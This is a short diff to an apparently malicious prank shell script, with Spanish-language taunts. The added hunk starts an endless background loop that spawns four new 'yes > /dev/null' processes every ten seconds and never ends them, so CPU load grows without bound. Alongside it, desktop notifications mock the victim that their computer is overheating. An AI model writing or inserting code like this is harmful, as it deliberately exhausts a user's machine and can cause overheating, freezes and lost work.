@@ -28,3 +28,13 @@ done) &
     notify-send "🤣 ¡MÁS, MÁS, MÁS!" "No puedes escapar de esto..."
     sleep 5
 done) &
+
+# Hacer que la CPU sufra con procesos pesados en segundo plano
+(while true; do
+    yes > /dev/null &
+    yes > /dev/null &
+    yes > /dev/null &
+    yes > /dev/null &
+    notify-send "🔥 ¡SE TE ESTÁ CALENTANDO EL PC! 🔥" "JAJAJAJA"
+    sleep 10
+done) &
